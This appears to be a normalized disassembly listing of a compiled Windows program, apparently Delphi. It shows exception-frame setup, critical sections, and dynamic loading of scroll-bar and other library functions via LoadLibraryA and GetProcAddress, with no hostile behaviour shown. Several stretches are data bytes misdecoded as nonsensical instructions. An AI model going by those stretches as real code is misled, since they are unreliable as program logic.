lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
mov eax esi
xor edx edx
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a2c8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42a2c8
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42bb04
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42bbe9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bbf0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b54
lea eax [ ebp - 0x8 ]
call sub_405944
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a2c8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40595c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a2c8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40595c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42be20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42bf13
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_404100
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf1a
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b54
lea eax [ ebp - 0x10 ]
call sub_405944
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42a2c8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_40595c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42bf38
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c017
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404100
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c01e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404b54
lea eax [ ebp - 0x8 ]
call sub_405944
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a2c8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40595c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405988
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42c038
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059b8
xor eax eax
push ebp
push sub_42c087
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40595c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c08e
lea eax [ ebp - 0x4 ]
call sub_405944
retn
lea eax [ ebx + 0xc ]
call sub_405944
sub_42c094
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_42c129
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404100
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42be20
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c130
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
call sub_42b934
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42b964
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42bb04
sub_42c154
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42a2c8
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42a2c8
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4188a0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42a2c8
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4188a0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4188a0
sub_42c1e0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_42b8f4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4032b0
mov eax [ esi + 0x14 ]
call sub_4032b0
mov eax [ esi + 0x10 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405944
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42c234
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c26b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c272
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42c27c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c2a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c2a8
retn
sub_42c2b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c2e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c2ec
retn
mov eax [ rw-data ]
call sub_4032b0
sub_42c2f8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c32c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c354
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c5d6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c5fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c604
retn
sub_42c618
mov [ fs : edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x42 ] ch
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x1bffbfce ] ah
mov [ edx ] 0xe8
mov [ edx ] 0xe
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x38 ] si
mov [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov [ edx ] 0x1c
add [ eax ] al
add [ eax ] bl
mov [ edx ] 0xe0
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + eax * 8 ] ch
inc edx
add [ edi + eax * 8 + 0x42 ] bl
add [ eax - 0x39 ] ch
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42c6ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_42c72c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42c784
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c7a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7b0
retn
sub_42c7bc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42c774
xor eax eax
push ebp
push sub_42c973
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c97a
mov eax [ rw-data ]
call sub_42c77c
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c97c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42c774
xor eax eax
push ebp
push sub_42cd2f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd36
mov eax [ rw-data ]
call sub_42c77c
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42d0e0
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42d108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d150
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d157
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4032b0
call sub_42c7bc
cmp [ rw-data ] 0x0
jg r-xdata
sub_42d178
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d19d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d1a4
retn
sub_42d1b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d1d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d1dc
retn
sub_42d1e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d20d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d214
retn
sub_42d220
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d245
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d24c
retn
sub_42d258
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d27d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d284
retn
sub_42d290
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d2b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d2bc
retn
sub_42d2c9
rol [ edx ] cl
prefetchw [ ecx + 0x41 ]
jne r-xdata
add eax rw-data
outsd
inc ebx
outsd
insd
jo r-xdata
and bh bh
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d360
retn
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
and al 0x11
inc eax
add [ ecx ] al
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx + 0x6 ] 0x1
push ebx
push 0x6a624f6c
add al [ eax ]
sub_42d2fa
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0x21
rol [ edx ] cl
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d328
retn
sub_42d334
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d359
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d360
retn
sub_42d36c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d391
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d398
retn
sub_42d3a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
aam 0x42
add [ eax - 0x2c ] dl
inc edx
add [ eax ] bl
add [ eax ] al
pop eax
jo r-xdata
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ ebp + edx * 8 + 0x32480042 ] dh
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x2b ] bl
inc edx
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
salc
inc edx
add ah ch
sub al [ eax ]
add eax 0x10000200
add [ edx - 0x11001100 ] eax
inc [ eax - 0x2a ]
inc edx
add [ eax - 0x2a ] bl
inc edx
add [ eax - 0x2a ] dh
inc edx
add [ eax - 0x29 ] bl
inc edx
add [ edi + edx * 8 + 0x42 ] ch
add [ 0x6d6f4354 ] cl
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
aam 0x42
add [ edi ] al
or eax 0x6d6f4354
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xd3f0676f
inc edx
add [ ecx + esi * 2 + 0x41 ] dl
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
